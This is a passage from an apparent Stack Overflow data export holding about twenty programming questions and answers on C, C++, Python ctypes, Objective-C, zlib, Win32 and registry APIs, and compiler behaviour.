// many functions as you want.  Hint: use a linked list instead of a single
// (function, argument) pair.
void CallFunctionOnMainThread(void (*funcPtr)(void*), void *funcArg)
{
    pthread_mutex_lock(&amp;gMutex);
    gFuncPtr = funcPtr;
    gFuncArg = funcArg;
    pthread_mutex_unlock(&amp;gMutex);
}
</code></pre>

<p>For Windows instead of POSIX, use <code>CRITICAL_SECTION</code>, <code>EnterCriticalSection</code>, and <code>LeaveCriticalSection</code> instead of <code>pthread_mutex_t</code>, <code>pthread_mutex_lock</code>, and <code>pthread_mutex_unlock</code> respectively, and don't forget to initialize and deinitialize the critical section appropriately.</p>
"
"<p>I'm doing some statistics work, I have a (large) collection of random numbers to compute the mean of, I'd like to work with generators, because I just need to compute the mean, so I don't need to store the numbers. </p>

<p>The problem is that numpy.mean breaks if you pass it a generator. I can write a simple function to do what I want, but I'm wondering if there's a proper, built-in way to do this?</p>

<p>It would be nice if I could say ""sum(values)/len(values)"", but len doesn't work for genetators, and sum already consumed values.</p>

<p>here's an example:</p>

<pre><code>import numpy 

def my_mean(values):
    n = 0
    Sum = 0.0
    try:
        while True:
            Sum += next(values)
            n += 1
    except StopIteration: pass
    return float(Sum)/n

X = [k for k in range(1,7)]
Y = (k for k in range(1,7))

print numpy.mean(X)
print my_mean(Y)
</code></pre>

<p>these both give the same, correct, answer, buy my_mean doesn't work for lists, and numpy.mean doesn't work for generators.</p>

<p>I really like the idea of working with generators, but details like this seem to spoil things.</p>
","9530","","<p>Your approach is a good one, but you should instead use the <code>for x in y</code> idiom instead of repeatedly calling <code>next</code> until you get a <code>StopIteration</code>.  This works for both lists and generators:</p>

<pre><code>def my_mean(values):
    n = 0
    Sum = 0.0

    for value in values:
        Sum += value
        n += 1
    return float(Sum)/n
</code></pre>
"
"<p>I've been trying to figure this out for a while now and I need help because I'm out of ideas. My WSAEventselect function returns error number 10038.</p>

<p>Code:</p>

<pre><code>        // Error checking....
        if(netEvent.iErrorCode[FD_ACCEPT_BIT] != 0)
        {
            int temp1 = WSAGetLastError();
            emit ClientErrorSignal();
            return;
        }

        // Initializing socket
        if((newClient = accept(this-&gt;info-&gt;socket, NULL, NULL)) == INVALID_SOCKET)
        {
            int temp2 = WSAGetLastError();
            emit ClientErrorSignal();
            return;
        }

        // This is where the error occurs
        if(WSAEventSelect(newClient, &amp;this-&gt;info-&gt;event, FD_READ|FD_CLOSE) == SOCKET_ERROR)
        {
            int temp3 = WSAGetLastError();
            emit ClientErrorSignal();
            return;
        }
</code></pre>

<p><code>this-&gt;info</code> is a struct that is passed into the thread. </p>

<pre><code>typedef struct {
    SOCKET socket;
    int size;
    bool isTcp;
    WSAEVENT event;
} SINFO, *PSINFO;
</code></pre>
","9530","","<p>This may or may not be related to your problem, but the second parameter you're passing to <code>WSAEventSelect</code> is a <code>WSAEVENT*</code>, whereas the function expects a <code>WSAEVENT</code>.  Just pass the handle directly, not its address:</p>

<pre><code>WSAEventSelect(..., info-&gt;event, ...);
</code></pre>
"
"<p>Is there a definitive way to see where a given <code>#include &lt;example.h&gt;</code> resolves to? I have a <code>#include &lt;linux/unistd.h&gt;</code> in my code but I don't know which <code>unistd.h</code> is being used.</p>
","9530","","<p>If you use the <code>-E</code> command line option to get the preprocessor output, it will tell you the full path to every header file included, including those included by other headers.  For example:</p>

<pre><code>$ cat test.c
#include &lt;unistd.h&gt;
$ gcc -E test.c
# 1 ""test.c""
# 1 ""&lt;built-in&gt;""
# 1 ""&lt;command-line&gt;""
# 1 ""test.c""
# 1 ""/usr/include/unistd.h"" 1 3 4
# 71 ""/usr/include/unistd.h"" 3 4
# 1 ""/usr/include/_types.h"" 1 3 4
# 27 ""/usr/include/_types.h"" 3 4
# 1 ""/usr/include/sys/_types.h"" 1 3 4
# 32 ""/usr/include/sys/_types.h"" 3 4
# 1 ""/usr/include/sys/cdefs.h"" 1 3 4
# 33 ""/usr/include/sys/_types.h"" 2 3 4
# 1 ""/usr/include/machine/_types.h"" 1 3 4
# 34 ""/usr/include/machine/_types.h"" 3 4
# 1 ""/usr/include/i386/_types.h"" 1 3 4
# 37 ""/usr/include/i386/_types.h"" 3 4
typedef signed char __int8_t;

(lots more output)
</code></pre>

<p>So in this case, the header that's being used is <code>/usr/include/unistd.h</code>.</p>
"
"<p>I am helping a friend to finish a final year project in which he has this circuit that we want to switch on and off using a C++ program.  </p>

<p><img src=""http://i.stack.imgur.com/IVyNI.jpg"" alt=""image of what i want""></p>

<p>I initially thought it would be easy, but I have failed to implement this program. 
The main problem is that </p>

<ul>
<li>Windows XP and above don't allow direct access to hardware so <a href=""http://www.beyondlogic.org/porttalk/porttalk.htm"" rel=""nofollow"">some websites</a> are suggesting that I need to write a driver or find a driver.</li>
<li>I have also looked at some projects online but they seem to work for Windows XP but fail to work for Windows 7.</li>
<li>Also, most projects were written in VB or C# which I am not familiar with.</li>
</ul>

<p><strong>Question:</strong></p>

<ul>
<li>Is there a suitable driver that works for Windows XP and Windows 7, and if yes how can I use it in my code? (code snippets would be appreciated)</li>
<li>Is there a cross platform way of dealing communicating with parallel ports?</li>
</ul>
","9530","","<p>You shouldn't need to write a driver or anything -- you just call <a href=""http://msdn.microsoft.com/en-us/library/aa363858%28v=vs.85%29.aspx"" rel=""nofollow""><code>CreateFile</code></a> with a filename like <code>""LPT1""</code> to open up a handle to the parallel port, and then you can use <a href=""http://msdn.microsoft.com/en-us/library/aa365747%28v=vs.85%29.aspx"" rel=""nofollow""><code>WriteFile</code></a> to write data to it.  For example:</p>

<pre><code>HANDLE parallelPort = CreateFile(""LPT1"", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if(parallelPort == INVALID_HANDLE_VALUE)
{
    // handle error
}
...
// Write the string ""foobar"" (and its null terminator) to the parallel port.
// Error checking omitted for expository purposes.
const char *data = ""foobar"";
WriteFile(parallelPort, data, strlen(data)+1, NULL, NULL);
...
CloseHandle(parallelPort);
</code></pre>
"
"<p>All- thanks for the great instruction you have provided.  I think this sketch will add clarity to what I am trying to achieve.</p>

<p>Essentially, I want to create iPhone app that allows user to select a schoolDistrict from a tableview and the app will slide that view over and reveal the next tableview full of schools.  When they select a school, the next view displays the teachers, finally, when they select a teacher, it will display the courses taught by that teacher.</p>

<p>So, I am trying to construct some sample data for my viewtable ""drilldown"" and I am struggling to populate such a hierarchical data structure.</p>

<p>I'm hoping the sketch below helps.</p>

<p><a href=""https://skitch.com/aibkwik/rqu41/photo-feb-13-10-30-15-pm.jpg"" rel=""nofollow"">https://skitch.com/aibkwik/rqu41/photo-feb-13-10-30-15-pm.jpg</a></p>

<p>original post follows:</p>

<p>UPDATED:   I am trying to alloc an array that is deeply embedded in an object hierarchy. The top object instance is call ""thisYear"" and it has an array in it called ""courses"". ""courses"" also contains, among other things, an array called scoreCatetories.  How would you initialize and add an object to the ""scoreCategories"" array? I've tried numerous things, including: </p>

<p>I'm trying all manner of combinations such as the one below - nothing is working.</p>

<pre><code>...
[[thisYear courses] scoreCategories] = [[NSMutableArray alloc] init];
[[[thisYear courses] scoreCategories] addObject:myNewObj]; 
...
I'm trying to load some sample data -  the code below is located in the
</code></pre>

<p>didFinishLaunchingWithOptions function of the appDelegate.</p>

<p>Here is the code snippet that is causing me grief.
Please see the .h files, further down in this post.</p>

<pre><code>dGradeURin *thisYear;
thisYear = [[dGradeURin alloc] init];
[thisYear.howManyTerms initWithInteger: 4];
thisYear.gradeURin = @""Freshman"";
//this paragraph compiles and runs fine
dCourse *tmpcourse;
tmpcourse = [[dCourse alloc] init];
tmpcourse.cName =@""Computer Science"";
tmpcourse.school =@""Freedom High"";
thisYear.courses = [[NSMutableArray alloc] init];
[thisYear.courses addObject:tmpcourse];


dScoringCategory *tmpSC;
tmpSC =  [[dScoringCategory alloc] init];
tmpSC.name = @""Quizzes"";

//these two lines are not working
[[thisYear courses] setScoreCategories:[[[NSMutableArray alloc] init] autorelease]];
[[[thisYear courses] scoreCategories] addObject:tmpSC];     

//both the above lines compile with a warning:  NSMutableArray may not responde to -setScoreCategories
// when I run the program, the first line causes crash with an exception... See stack trace at far bottom
</code></pre>

<p>Any help greatly appreciated.</p>

<p>===================</p>

<p>Here are the .h header file snippets for  each  interface object definitions, in essence...</p>

<p>@interface dGradeURin : NSObject {</p>

<pre><code>NSNumber *howManyTerms;
NSString  *gradeURin;

NSMutableArray *courses;
</code></pre>

<p>}</p>

<p>@property (retain, nonatomic) NSNumber *howManyTerms;
@property (retain, nonatomic) NSString *gradeURin;
@property (retain, nonatomic) NSMutableArray  *courses;</p>

<pre><code>@interface dCourse  : NSObject {
    NSString *cName;
    NSString *teacher;
    NSString *school;
    NSString *school_term;
    NSString *gradingMethod;
    NSNumber *whichterm;

    NSMutableArray  *scoreCategories;
}

@property (retain, nonatomic) NSString *cName;
@property (retain, nonatomic) NSString *school;
@property (retain, nonatomic) NSMutableArray *scoreCategories;





@interface dScoringCategory : NSObject {
NSString *name;
NSMutableArray *scores;
</code></pre>

<p>}</p>

<p>@property (retain, nonatomic) NSString *name;
@property (retain, nonatomic) NSMutableArray *scores;</p>

<p>@interface dScore : NSObject {</p>

<pre><code>NSNumber    *score;
NSDate      *scoreDate;
NSString    *description;
</code></pre>

<p>}</p>

<p>@property (retain, nonatomic) NSDate *scoreDate;
@property (retain, nonatomic) NSNumber *score;
@property (retain, nonatomic) NSString *description;</p>

<p>================================
Here is the stack trace</p>

<p>2011-02-13 21:49:43.559 GradeJanx[86526:40b] -[<strong>NSArrayM setScoreCategories:]: unrecognized selector sent to instance 0x4b76660
2011-02-13 21:49:43.561 GradeJanx[86526:40b] <em>*</em> Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '-[__NSArrayM setScoreCategories:]: unrecognized selector sent to instance 0x4b76660'
<em>*</em> Call stack at first throw:
(
    0   CoreFoundation                      0x00db0be9 __exceptionPreprocess + 185
    1   libobjc.A.dylib                     0x00f055c2 objc_exception_throw + 47
    2   CoreFoundation                      0x00db26fb -[NSObject(NSObject) doesNotRecognizeSelector:] + 187
    3   CoreFoundation                      0x00d22366 __<em>forwarding</em></strong> + 966
    4   CoreFoundation                      0x00d21f22 _CF_forwarding_prep_0 + 50
    5   GradeJanx                           0x00002c50 -[AppDelegate_iPhone application:didFinishLaunchingWithOptions:] + 881
    6   UIKit                               0x002ba1fa -[UIApplication _callInitializationDelegatesForURL:payload:suspended:] + 1163
    7   UIKit                               0x002bc55e -[UIApplication _runWithURL:payload:launchOrientation:statusBarStyle:statusBarHidden:] + 439
    8   UIKit                               0x002c6db2 -[UIApplication handleEvent:withNewEvent:] + 1533
    9   UIKit                               0x002bf202 -[UIApplication sendEvent:] + 71
    10  UIKit                               0x002c4732 _UIApplicationHandleEvent + 7576
    11  GraphicsServices                    0x016e6a36 PurpleEventCallback + 1550
    12  CoreFoundation                      0x00d92064 <strong>CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE1_PERFORM_FUNCTION</strong> + 52
    13  CoreFoundation                      0x00cf26f7 __CFRunLoopDoSource1 + 215
    14  CoreFoundation                      0x00cef983 __CFRunLoopRun + 979
    15  CoreFoundation                      0x00cef240 CFRunLoopRunSpecific + 208
    16  CoreFoundation                      0x00cef161 CFRunLoopRunInMode + 97
    17  UIKit                               0x002bbfa8 -[UIApplication _run] + 636
    18  UIKit                               0x002c842e UIApplicationMain + 1160
    19  GradeJanx                           0x000028bc main + 102
    20  GradeJanx                           0x0000284d start + 53</p>
","9530","","<p>If it's a declared property (with the <code>@property</code> syntax), then you can use the dot notation to set the property value:</p>

<pre><code>// This assumes that scoreCategories has either the 'retain' or 'copy' property;
// if it instead uses 'assign', then you'll need to retain this array.
[thisYear courses].scoreCategories = [NSMutableArray arrayWithObjects:myNewObj, nil];
</code></pre>

<p>If it's not a declared property, just access it using the standard arrow notation:</p>

<pre><code>[thisYear courses]-&gt;scoreCategories = [[NSMutableArray alloc] initWithObjects:myNewObj, nil];
</code></pre>
"
"<p>Hey, I was wondering if anyone knew how I could compress a tarball file with gzip. I checked out <a href=""http://stackoverflow.com/questions/813223/how-to-compress-a-directory-with-libbz2-in-c"">this</a> already and compressed a tarball successfully, although I want to then compress that tarball with gzip instead of libbz2.</p>

<p>I have also tried implementing the <code>gztack</code> function from the <code>gzappend.c</code> example from the <a href=""http://zlib.net/zlib-1.2.5.tar.gz"" rel=""nofollow"">zlib source code.</a> but ended up getting a bunch of errors and deprecating warnings, so I figured I won't get much out of a deprecated example.</p>

<p>Does anyone know how I can achieve this, preferably with the zlib library?</p>
","9530","","<p>Use the <a href=""http://www.zlib.net/manual.html"" rel=""nofollow"">zlib</a> routines <code>gzopen</code> to open a compressed stream, <code>gcwrite</code> to write data to it and compress it, and <code>gzclose</code> to close it.  Here's a complete program that compresses one file to another:</p>

<pre><code>#include &lt;errno.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;zlib.h&gt;

int main(int argc, char **argv)
{
  if(argc &lt; 3)
  {
    fprintf(stderr, ""Usage: %s input output\n"", argv[0]);
    return 1;
  }

  // Open input &amp; output files
  FILE *input = fopen(argv[1], ""rb"");
  if(input == NULL)
  {
    fprintf(stderr, ""fopen: %s: %s\n"", argv[1], strerror(errno));
    return 1;
  }

  gzFile output = gzopen(argv[2], ""wb"");
  if(output == NULL)
  {
    fprintf(stderr, ""gzopen: %s: %s\n"", argv[2], strerror(errno));
    fclose(input);
    return 1;
  }

  // Read in data from the input file, and compress &amp; write it to the
  // output file
  char buffer[8192];
  int N;
  while((N = fread(buffer, 1, sizeof(buffer), input)) &gt; 0)
  {
    gzwrite(output, buffer, N);
  }

  fclose(input);
  gzclose(output);

  return 0;
}
</code></pre>

<p>Use it like this:</p>

<pre><code>$ ./mygzip input output.gz
$ diff input &lt;(gunzip &lt; output.gz)  # Verify that it worked
</code></pre>
"
"<p>My background is Linux and traditional makefiles.  I have a project where the makefile builds several dozen executables I can then run to perform tests against the library being developed.  This library is now ported to Windows.</p>

<p><strong>My question:</strong>  In Microsoft Visual C++, do I have to create a new project for every individual test <code>.exe</code> file?  Or is there a way to create 1 project that will easily build all of the .exe files?  E.g., <code>test001.cpp</code> becomes <code>test001.exe</code>, <code>test002.cpp</code> becomes <code>test002.exe</code>, etc.</p>

<p>I'm using Microsoft Visual C++ 2010 Express.  Right now what I do is click on <code>File-&gt;Add-&gt;New Project...-&gt;Win32 Console Application-&gt;...</code> for every test executable.  But it would be nicer if all these test files could be built without a new project for each one.</p>
","9530","","<p>If you're using Visual Studio in the normal fashion, then yes, each VS project (i.e. each <code>.vcproj</code> file) corresponds to exactly one output file (an executable, DLL, or static library).</p>

<p>You can also use Visual Studio with makefiles though, if you want.  Just write your makefile as usual, except the C++ compiler is the <code>cl.exe</code> in the VS binaries directory, the linker is <code>link.exe</code>, and of course all of the command line flags are completely different.  You can even set your VS project to use <code>make</code> instead of its built-in system, so you can still use the IDE for editing and debugging.</p>
"
"<p>For work we have two shortcuts that get installed to the start menu with both of them pointing to the same exe (but the second with different command line arguments). </p>

<p>Some times windows will pick the second shortcut to display in the start menu hot program list which is bad because it causes a full update of the application.</p>

<p>Is there a way to tell windows not to show that shortcut in the start menu list?</p>
","9530","","<p>Yes, in fact Raymond Chen <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2011/02/11/10127763.aspx"" rel=""nofollow"">just wrote about this</a>:</p>

<blockquote>
  <p>You can set the <a href=""http://msdn.microsoft.com/en-us/library/dd391568%28VS.85%29.aspx"" rel=""nofollow""><code>System.App­User­Model.Exclude­From­Show­In­New­Install</code> property</a> to <code>VARIANT_TRUE</code> to tell the Start menu, ""I am not the primary entry point for the program; I'm a secondary shortcut, like a help file.""</p>
</blockquote>

<p>Sample code (<a href=""http://blogs.msdn.com/b/oldnewthing/archive/2004/05/20/135841.aspx"" rel=""nofollow""><code>CCoInitialize</code> class</a>):</p>

<pre><code>#include &lt;windows.h&gt;
#include &lt;tchar.h&gt;
#include &lt;shlobj.h&gt;
#include &lt;atlbase.h&gt;

// class 3CCoInitialize incorporated here by reference

int __cdecl _tmain(int argc, TCHAR **argv)
{
 // error checking elided for expository purposes
 CCoInitialize init;
 CComPtr&lt;IShellLink&gt; spsl;
 spsl.CoCreateInstance(CLSID_ShellLink);
 spsl-&gt;SetPath(TEXT(""C:\\Program Files\\LitWare\\LWUpdate.exe""));
 PROPVARIANT pvar;
 pvar.vt = VT_BOOL;
 pvar.boolVal = VARIANT_TRUE;
 CComQIPtr&lt;IPropertyStore&gt;(spsl)-&gt;SetValue(PKEY_AppUserModel_ExcludeFromShowInNewInstall, pvar);
 CComQIPtr&lt;IPersistFile&gt;(spsl)-&gt;Save(L""LitWare Update.lnk"", TRUE);
 return 0;
}
</code></pre>
"
"<p>Ok, so I want to run simple opengl program that I've written, on other computers.
I can run it successfully on my machine. It doesn't give any errors.
When I run it on other computer however it says ""cannot start application because MSVCR100.dll was not found""
What's the problem? Or maybe I'm doing something wrong?</p>

<ul>
<li>I tried both compilations on Visual Studio 2010, Debug and Release.</li>
<li>executable always have been shipped with glut32.dll in the same directory</li>
</ul>
","9530","","<p>MSVCR100.dll is the C runtime associated with Visual Studio 2010.  In order to run successfully, the other computer needs a copy of that runtime DLL.  It can get it either by installing Visual Studio 2010 on it (not recommended), or installing the <a href=""http://www.microsoft.com/downloads/en/details.aspx?FamilyID=a7b7a05e-6de6-4d3a-a423-37bf0912db84"" rel=""nofollow"">Microsoft Visual C++ 2010 Redistributable Package</a> <strong>(recommended)</strong>.</p>

<p>Note that you must compile your program in Release mode, not Debug mode—a Debug build links against the debug version of the C runtime, for which Microsoft does make a redistributable package.  It is illegal to redistribute the debug runtime DLLs, so if you want to distribute your software and be able to run it anywhere, you need to link against the release runtime libraries.</p>
"
"<p>Where is [super init] method actually located and what happens if we negotiate calling super init method?</p>
","9530","","<p>That depends on entirely on the superclass.  If your class derives from <code>NSObject</code>, then it calls the <code>-init</code> method in the <code>NSObject</code> class.  If your class derives from the class <code>ParentClass</code>, then it calls the <code>-init</code> method in <code>ParentClass</code>.</p>

<p>Not sure what you mean by ""negotiate"" calling the super init method.</p>
"
"<p>I have a database of mostly correct datetimes but a few are broke like so: <code>Sat Dec 22 12:34:08 PST 20102015</code></p>

<p>Without the invalid year, this was working for me:</p>

<pre><code>end_date = soup('tr')[4].contents[1].renderContents()
end_date = time.strptime(end_date,""%a %b %d %H:%M:%S %Z %Y"")
end_date = datetime.fromtimestamp(time.mktime(end_date))
</code></pre>

<p>But once I hit an object with a invalid year I get <code>ValueError: unconverted data remains: 2</code>, which is great but im not sure how best to strip the bad characters out of the year. They range from 2 to 6 <code>unconverted characters</code>.</p>

<p>Any pointers? I would just slice <code>end_date</code> but im hoping there is a datetime-safe strategy.</p>
","9530","","<p>Unless you want to rewrite <code>strptime</code> (a very bad idea), the only real option you have is to slice <code>end_date</code> and chop off the extra characters at the end, assuming that this will give you the correct result you intend.</p>

<p>For example, you can catch the <code>ValueError</code>, slice, and try again:</p>

<pre><code>fmt = ""%a %b %d %H:%M:%S %Z %Y""
try:
    end_date = time.strptime(end_date, fmt)
except ValueError, v:
    if len(v.args) &gt; 0 and v.args[0].startswith('unconverted data remains: '):
        end_date = end_date[:-(len(v.args[0])-26)]
        end_date = time.strptime(end_date, fmt)
    else:
        raise v
</code></pre>
"
"<p>I am trying to print the microsecond symbol in C, but I don't get any data in the output.</p>

<pre><code>printf(""Micro second = \230"");
</code></pre>

<p>I also tried using 
int i = 230;</p>

<pre><code>printf(""Character %c"", i);
</code></pre>

<p>but in vain! Any pointers?</p>
","9530","","<p>That depends entirely on the character encoding used by the console you're using.  If you're using Linux or Mac OS X, then most likely that encoding is <a href=""http://en.wikipedia.org/wiki/UTF-8"" rel=""nofollow"">UTF-8</a>.  The UTF-8 encoding for µ (Unicode code point U+00B5) is 'C2 B5' (two bytes), so you can print it like this:</p>

<pre><code>printf(""Micro second = \xC2\xB5"");  // UTF-8
</code></pre>

<p>If you're on Windows, then the default encoding used by the console is <a href=""http://en.wikipedia.org/wiki/Code_page_437"" rel=""nofollow"">code page 437</a>, then µ is encoded as 0xE6, so you would have to do this:</p>

<pre><code>printf(""Micro second = \xE6"");  // Windows, assuming CP 437
</code></pre>
"
"<p>I'm <a href=""http://docs.python.org/dev/library/struct.html#struct.unpack"">unpacking</a> several structs that contain <a href=""http://docs.python.org/dev/library/struct.html#format-characters""><code>'s'</code></a> type fields from C. The fields contain zero-padded UTF-8 strings handled by <a href=""http://linux.die.net/man/3/strncpy""><code>strncpy</code></a> in the C code (note this function's vestigial behaviour). If I decode the bytes I get a unicode string with lots of <code>NUL</code> characters on the end.</p>

<pre><code>&gt;&gt;&gt; b'hiya\0\0\0'.decode('utf8')
'hiya\x00\x00\x00'
</code></pre>

<p>I was under the impression that trailing zero bytes were part of UTF-8 and would be dropped automatically.</p>

<p>What's the proper way to drop the zero bytes? </p>
","9530","","<p>Use <a href=""http://docs.python.org/library/stdtypes.html#str.rstrip""><code>str.rstrip()</code></a> to remove the trailing NULs:</p>

<pre><code>&gt;&gt;&gt; 'hiya\0\0\0'.rstrip('\0')
'hiya'
</code></pre>
"
"<p>how can I check if the string is matched with an expression using regex c++
(its for robots.txt parser)</p>

<pre><code>eg:

string will be an url
http://www.google.com/example/e/se/in

/*/e/*
</code></pre>

<p>means i need to match with the url if it is present or not ....normal query like <code>/example/</code>
can be matched using substring but ..how can i parse some thing similar to this</p>
","9530","","<p>Regexes have no language support in the current C++ standard.  You'll have to use a 3rd-party library such as <a href=""http://www.boost.org/doc/libs/1_46_0/libs/regex/doc/html/index.html"" rel=""nofollow"">Boost.Regex</a> or <a href=""http://www.pcre.org/"" rel=""nofollow"">PCRE</a>.</p>

<p>The upcoming C++0x language standard does provide regexes in the <code>&lt;regex&gt;</code> header file, but the standard has not been finalized, and compiler support for the draft standard is limited.  Unless you're already developing code for the C++0x draft, I'd advise against this option to ensure that your code is portable.</p>
"
"<p>As part of answering another question, I wanted to show that the insane level of optimisation of <code>gcc</code> (<code>-O3</code>) would basically strip out any variables that weren't used in main. The code was:</p>

<pre><code>#include &lt;stdio.h&gt;
int main (void) {
   char bing[71];
   int x = 7;
   bing[0] = 11;
   return 0;
}
</code></pre>

<p>and the <code>gcc -O3</code> output was:</p>

<pre><code>    .file ""qq.c""
    .text
    .p2align 4,,15
.globl main
    .type main, @function
main:
    pushl %ebp
    xorl %eax, %eax
    movl %esp, %ebp
    popl %ebp
    ret
    .size main, .-main
    .ident ""GCC: (Ubuntu 4.4.3-4ubuntu5) 4.4.3""
    .section .note.GNU-stack,"""",@progbits
</code></pre>

<p>Now I can see it's removed the local variables but there's still quite a bit of wastage in there. It seems to me that the entire:</p>

<pre><code>    pushl %ebp
    xorl %eax, %eax
    movl %esp, %ebp
    popl %ebp
    ret
</code></pre>

<p>section could be replaced with the simpler:</p>

<pre><code>    xorl %eax, %eax
    ret
</code></pre>

<p>Does anyone have any idea why <code>gcc</code> does not perform this optimisation? I know that would save very little for <code>main</code> itself but, if this were done with normal functions as well, the effect of unnecessarily adjusting the stack pointer in a massive loop would be considerable.</p>

<p>The command used to generate the assembly was:</p>

<pre><code>gcc -O3 -std=c99 -S qq.c
</code></pre>
","9530","","<p>You can enable that particular optimization with the <code>-fomit-frame-pointer</code> compiler flag.  Doing so makes debugging impossible on some machines and substantially more difficult on everything else, which is why it's usually disabled.</p>

<p>Although your GCC documentation may say that <code>-fomit-frame-pointer</code> is enabled at various optimization levels, you'll likely find that that's not the case—you'll almost certainly have to explicitly enable it yourself.</p>
"
"<p>I am trying to load a DLL in Python, I want to use its eConnect() function using <a href=""http://docs.python.org/library/ctypes.html#module-ctypes"" rel=""nofollow"">ctypes</a></p>

<p>What I know from the source code of the DLL:</p>

<ul>
<li>from the *.cpp source code: <code>bool eConnect( const char *host, UINT port, int clientId=0);</code></li>
<li>from the dependency walker tool: function ordinal is 6 and undecorated name is<br>
<code>?eConnect@EClientSocket@@UAE_NPBDIH@Z</code></li>
</ul>

<p>I tried to access the eConnect from two ways myfunction and myfunction2, but I probably get it wrong. Here is my code:</p>

<pre><code>from ctypes import *

def main():

IP = c_char_p('127.0.0.1')
port = c_uint(7496)
client_id = c_int(0)

myfunction = getattr(cdll.TwsSocketClient, ""?eConnect@EClientSocket@@UAE_NPBDIH@Z"")
myfunction2= cdll.TwsSocketClient[6]

print myfunction
print myfunction2

print myfunction(IP, port, client_id,IP)

if __name__ == ""__main__"":
main()
</code></pre>

<p>I get the below error:</p>

<p>""WindowsError: exception: access violation reading 0x0000002D""</p>

<p>I would badly need some help here (I do not know c++).
Thanks!</p>
","9530","","<p>The function being exported is a class member function of the class <code>EClientSocket</code>.  You're attempting to call that function from Python without passing in an <code>EClientSocket</code> pointer as the <code>this</code> parameter; furthermore, ctypes doesn't know anything about the <code>__thiscall</code> calling convention, so even if you did pass in an <code>EClientSocket</code> instance, it would be on the stack instead of in the ECX register.</p>

<p>The only real solution to this would be to export a C wrapper from your DLL that forwards the call to <code>eConnect</code>.  For example:</p>

<pre><code>extern ""C"" DLLEXPORT
bool EClientSocket_eConnect(EClientSocket *This, const char *host, UINT port, int clientId)
{
    return This-&gt;eConnect(host, port, clientId);
}
</code></pre>

<p>However, even in that case, you have to be extra-careful on the Python side to construct an appropriate <code>EClientSocket</code> instance.  I'd strongly recommend reconsidering your approach here.</p>
"
"<p>I'm using ctypes to work with libgphoto2 in Python. The following code succeeds on a 32-bit machine, but fails with a Segmentation Fault on a 64-bit machine (Linux, Ubuntu):</p>

<pre><code>import ctypes

gp = ctypes.CDLL('libgphoto2.so')
a = gp.gp_library_version(0)
x = ctypes.c_char_p.from_address(a)
x.value
</code></pre>

<p>libphoto2, ctypes and python are all from repositories, so I assume that the problem is in my code; I need to consider pointers in a more general way or something like that. <code>gp_library_version()</code> returns <code>const char **</code>, an array of string constants. Other <code>gp_*</code> functions work fine.</p>
","9530","","<p>The problem is that, by default, ctypes assumes that all functions return <code>int</code>, which is 32 bits.  But, on a 64-bit system, a pointer is 64 bits, so you're dropping the upper 32 bits from the pointer return value, so you then get a segfault when you try to dereference that invalid pointer.</p>

<p>You can change the expected return type of a function by assigning a type to its <code>restype</code> attribute like so:</p>

<pre><code>gp = ctypes.CDLL('libgphoto2.so')
gp.gp_library_version.restype = ctypes.POINTER(ctypes.c_char_p)
a = gp.gp_library_version(0)
print a[0].value
</code></pre>
"
"<p>For a script that will check/set a Windows registry value. No GUI.<br>
Am writing in Visual Studio, but do not want .NET - just C++.</p>

<p>However, I haven't figured out where and what methods exist natively in C++ [NOT Visual C++]
that interface with the registry.<br>
I also haven't worked out how to compile C++ code in Visual Studio 2010 without .NET.</p>

<p>Can someone please direct me to the documentation (or even better, tutorials) of the standard C++ registry related methods.<br>
And furnish me with instructions or point out a tutorial that will allow a complete and total noob to compile in VS a non .NET program.</p>

<p>Please do NOT argue about my aversion to .NET, that has been the subject of other threads.</p>
","9530","","<p><a href=""http://msdn.microsoft.com/en-us/library/ms724875%28v=VS.85%29.aspx"" rel=""nofollow"">Here's</a> a list of all of the native functions for interacting with the registry.  The most useful ones are probably <code>RegOpenKeyEx</code>, <code>RegQueryValueEx</code>, <code>RegSetValueEx</code>, and <code>RegCloseKey</code>.</p>

<p>A number of good articles describing usage of the registry can be found <a href=""http://msdn.microsoft.com/en-us/library/ms724182%28v=VS.85%29.aspx"" rel=""nofollow"">here</a>.</p>
"
"<p>I'm writing a simple application where I want to replace certain words with other words, i'm running into problems with words that use single quotes such as aren't, ain't, isn't, etc</p>

<p>I have a text file with the following</p>

<pre><code>aren’t=ain’t
hello=hey
</code></pre>

<p>I parse the text file and create a dictionary out of it</p>

<pre><code>u'aren\u2019t' = u'ain\u2019t'
u'hello' = u'hey'
</code></pre>

<p>Then I try to replace all the characters in a given text</p>

<pre><code>text = u""aren't""

def replace_all(text, dict):
    for i, k in dict.iteritems():
        #replace all whole words of I with K in lower cased text, regex = \bSTRING\b
        text = re.sub(r""\b"" + i + r""\b"", k , text.lower())
    return text
</code></pre>

<p>The problem is that re.sub doesnt match u'aren\u2019t' with u""aren't"". </p>

<p>What can I do so that my replace_all function will match both hello and aren't and replace them with the appropriate text. Can i do something in python so that my dictionary doesnt contain unicode? Could I convert my text to use a unicode character, or could I modify the regex to match the unicode character as well as all the other text.</p>

<p>Thanks ahead of time for the help.</p>
","9530","","<p>This works fine for me in Python 2.6.4:</p>

<pre><code>&gt;&gt;&gt; re.sub(ur'\baren\u2019t\b', 'rep', u'aren\u2019t')
u'rep'
</code></pre>

<p>Make sure that your pattern string is a Unicode string, otherwise it might not work.</p>
"
"<p>I have programmed in both Java and C, and now I am trying to get my hands dirty with C++.</p>

<p>Given this code:</p>

<pre><code>class Booth {

private :
          int tickets_sold;
public :
          int get_tickets_sold();
          void set_tickets_sold();
};
</code></pre>

<p>In Java, wherever I needed the value of <code>tickets_sold</code>, I would call the getter repeatedly.</p>

<p>For example:</p>

<pre><code>if (obj.get_tickets_sold() &gt; 50 &amp;&amp; obj.get_tickets_sold() &lt; 75){
     //do something
}
</code></pre>

<p>In C I would just get the value of the particular variable in the structure:</p>

<pre><code>if( obj_t-&gt;tickets_sold &gt; 50 &amp;&amp; obj_t-&gt;tickets_sold &lt; 75){
    //do something
}
</code></pre>

<p>So while using structures in C, I save on the two calls that I would otherwise make in Java, the two getters that is, I am not even sure if those are actual calls or Java somehow inlines those calls.</p>

<p>My point is if I use the same technique that I used in Java in C++ as well, will those two calls to getter member functions cost me, or will the compiler somehow know to inline the code? (thus reducing the overhead of function call altogether?) </p>

<p>Alternatively, am I better off using:</p>

<pre><code>int num_tickets = 0;

if ( (num_tickets = obj.get_ticket_sold()) &gt; 50 &amp;&amp; num_tickets &lt; 75){
    //do something
}
</code></pre>

